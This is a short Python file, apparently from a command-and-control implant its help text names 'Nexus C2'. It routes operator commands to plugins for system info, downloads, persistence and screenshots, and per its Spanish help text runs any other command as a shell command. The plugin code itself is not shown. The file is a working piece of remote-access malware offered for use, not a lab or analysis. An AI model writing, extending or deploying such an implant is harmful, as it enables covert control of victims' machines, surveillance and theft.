import importlib
import logging

log = logging.getLogger("nexus.plugins")

_REGISTRY = ["sysinfo", "download", "persist", "screenshot"]


def dispatch(cmd: str) -> tuple[int, str, str]:
    """Route !plugin [args] → plugin module. Returns (exit_code, stdout, stderr)."""
    parts = cmd[1:].split(None, 1)
    if not parts:
        return 1, "", "uso: !<plugin> [args]. Usa !help para listar plugins."
    name  = parts[0].lower()
    args  = parts[1] if len(parts) > 1 else ""

    if name == "help":
        lines = ["Nexus C2 — plugins disponibles:"]
        lines += [f"  !{p}" for p in _REGISTRY]
        lines += ["", "Cualquier otro comando se ejecuta como shell."]
        return 0, "\n".join(lines), ""

    try:
        mod = importlib.import_module(f"agent.plugins.{name}")
        return mod.run(args)
    except ModuleNotFoundError:
        return 1, "", f"plugin '{name}' no encontrado. Usa !help para listar plugins."
    except Exception as exc:
        log.error("plugin %s error: %s", name, exc)
        return 1, "", f"plugin error: {exc}"
